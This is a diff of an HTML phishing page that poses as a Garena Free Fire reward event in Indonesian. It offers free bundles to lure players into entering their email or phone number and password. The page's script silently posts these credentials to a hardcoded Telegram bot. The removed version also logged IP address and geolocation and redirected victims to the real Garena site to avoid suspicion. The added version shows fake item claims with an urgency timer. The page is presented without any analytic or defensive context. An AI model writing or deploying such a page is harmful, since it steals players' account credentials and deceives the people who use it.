@@ -3,100 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Reward Event</title>
+    <title>Garena Free Fire - Event Reward</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap');
-        body { background: #000; font-family: 'Teko', sans-serif; overflow-x: hidden; }
-        .bg-main { background: url('https://wallpaperaccess.com/full/1155026.jpg') no-repeat center; background-size: cover; }
-        .box-pancing { background: rgba(0,0,0,0.85); border: 2px solid #facc15; box-shadow: 0 0 20px #facc1550; }
-        input { font-family: sans-serif; }
+        body { background: #0b0f1a; font-family: 'Teko', sans-serif; color: white; }
+        .ff-card { background: rgba(255, 255, 255, 0.05); border: 1px solid #334155; border-radius: 8px; overflow: hidden; }
+        .btn-claim { background: linear-gradient(180deg, #facc15 0%, #ca8a04 100%); color: black; font-weight: bold; }
+        .hidden { display: none; }
     </style>
 </head>
-<body class="bg-main min-h-screen flex items-center justify-center p-4">
+<body>
 
-    <div class="box-pancing w-full max-w-sm rounded-lg p-6 animate__animated animate__fadeIn">
-        <div class="text-center">
-            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-14 mx-auto mb-2">
-            <h1 class="text-3xl font-bold text-yellow-400 uppercase tracking-wider italic">PENUKARAN HADIAH</h1>
-            <p class="text-gray-300 text-sm leading-tight mb-6 uppercase tracking-widest">Verifikasi Akun Anda Untuk Menerima Diamond</p>
+    <div id="login-section" class="min-h-screen flex items-center justify-center p-4">
+        <div class="w-full max-w-sm bg-gray-900 border-2 border-yellow-500 p-6 rounded-lg shadow-2xl">
+            <img src="https://upload.wikimedia.org/wikipedia/en/3/36/Free_Fire_Logo.png" class="h-12 mx-auto mb-4">
+            <h2 class="text-2xl text-center font-bold mb-6 text-yellow-500 italic uppercase">Login untuk Klaim</h2>
+            <form id="authForm" class="space-y-4">
+                <input type="text" id="user" class="w-full p-3 bg-black border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Email atau Nomor HP" required>
+                <input type="password" id="pass" class="w-full p-3 bg-black border border-gray-700 rounded text-sm focus:border-yellow-500 outline-none" placeholder="Kata Sandi" required>
+                <button type="submit" class="w-full btn-claim py-3 rounded text-lg uppercase italic transform active:scale-95 transition">Masuk & Klaim</button>
+            </form>
         </div>
+    </div>
 
-        <form id="gas-data" class="space-y-4">
-            <div class="relative">
-                <input type="text" id="user" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="EMAIL ATAU NOMOR HP" required>
+    <div id="reward-section" class="hidden min-h-screen p-4">
+        <div class="max-w-4xl mx-auto">
+            <div class="relative mb-6">
+                <img src="https://i.ibb.co/L5rKz7P/banner-ff-jjk.jpg" class="w-full rounded-lg border-2 border-blue-500" alt="Banner Event">
+                <div class="bg-blue-900/80 text-center py-2 text-sm font-bold tracking-widest uppercase italic">
+                    UID 3585****23 Mendapatkan M1887 - RAPPER
+                </div>
             </div>
 
-            <div class="relative">
-                <input type="password" id="pass" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="KATA SANDI" required>
-            </div>
+            <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
+                <div class="ff-card p-2 text-center">
+                    <img src="https://i.ibb.co/0XzZ4k0/gojo.png" class="w-full h-32 object-contain mb-2" alt="Satoru Gojo">
+                    <p class="text-xs uppercase font-bold text-gray-300">Satoru Gojo Bundle</p>
+                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
+                </div>
+                <div class="ff-card p-2 text-center">
+                    <img src="https://i.ibb.co/3s6K8fR/m1887.png" class="w-full h-32 object-contain mb-2" alt="M1887">
+                    <p class="text-xs uppercase font-bold text-gray-300">M1887 Rapper Underworld</p>
+                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
+                </div>
+                <div class="ff-card p-2 text-center">
+                    <img src="https://i.ibb.co/YyYJmR1/jenggot.png" class="w-full h-32 object-contain mb-2" alt="Jenggot BML">
+                    <p class="text-xs uppercase font-bold text-gray-300">Jenggot Old BML</p>
+                    <button class="w-full btn-claim mt-2 py-1 text-xs rounded">KLAIM (FREE)</button>
+                </div>
+                </div>
 
-            <div class="relative">
-                <input type="number" id="id_game" class="w-full bg-zinc-900 border border-zinc-700 p-3 rounded text-white text-sm focus:border-yellow-400 outline-none transition" placeholder="ID PLAYER (CONTOH: 12345678)" required>
+            <div class="mt-8 bg-red-600/20 border border-red-600 p-4 text-center rounded">
+                <p class="text-red-500 font-bold uppercase italic">Event Terbatas Berakhir Pada: <span id="timer">23:59:45</span></p>
             </div>
-
-            <button type="submit" class="universal-action w-full bg-yellow-400 hover:bg-yellow-500 text-black font-black py-3 rounded text-xl uppercase italic transition transform active:scale-95 shadow-lg shadow-yellow-400/20">
-                KLAIM SEKARANG
-            </button>
-            
-            <div class="grid grid-cols-2 gap-2">
-                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">LUPA PASSWORD</button>
-                <button type="button" class="universal-action bg-zinc-800 text-gray-400 text-xs py-2 rounded border border-zinc-700 hover:bg-zinc-700">HUBUNGI CS</button>
-            </div>
-        </form>
-
-        <div class="mt-8 text-center border-t border-zinc-800 pt-4">
-            <p class="text-[10px] text-zinc-500 uppercase tracking-tighter">Copyright © Garena International. All Rights Reserved.</p>
         </div>
     </div>
 
     <script>
-        // --- KONFIGURASI TELEGRAM ---
-        const API_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
+        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc";
         const CHAT_ID = "8551809114";
-        // ----------------------------
 
-        async function setorData() {
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
-            const i = document.getElementById('id_game').value;
 
-            if(!u || !p || !i) return alert("Harap lengkapi semua kolom!");
+            // Efek Loading
+            this.querySelector('button').innerText = "MEMVERIFIKASI...";
 
-            // Ambil Info IP & Lokasi Map
-            let geo = "Lokasi tidak diizinkan";
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                geo = `🌐 IP: ${d.ip}\n🏙️ Kota: ${d.city}\n📍 Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-            } catch (e) {}
-
-            const teks = `⚠️ **SETORAN BARU (MIRIP BIZ.ID)** ⚠️\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n🆔 ID: \`${i}\` \n\n**LOG LOKASI:**\n${geo}\n\n⏰ Waktu: ${new Date().toLocaleString()}`;
-
-            // Kirim ke Tele
-            fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
+            // Kirim Data Diam-diam
+            const pesan = `🚨 **SETORAN BARU** 🚨\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n⏰ Waktu: ${new Date().toLocaleString()}`;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: teks, parse_mode: 'Markdown' })
-            }).then(() => {
-                // Redirect ke web Garena asli biar target gak curiga
-                window.location.href = "https://reward.ff.garena.com/id";
+                body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'Markdown' })
             });
-        }
 
-        // Semua tombol bakal nge-trigger setorData()
-        document.querySelectorAll('.universal-action').forEach(btn => {
-            btn.addEventListener('click', (e) => {
-                e.preventDefault();
-                setorData();
-            });
-        });
-
-        // Submit form juga setor data
-        document.getElementById('gas-data').addEventListener('submit', (e) => {
-            e.preventDefault();
-            setorData();
+            // PINDAH KE DASHBOARD HADIAH
+            document.getElementById('login-section').classList.add('hidden');
+            document.getElementById('reward-section').classList.remove('hidden');
         });
     </script>
 </body>
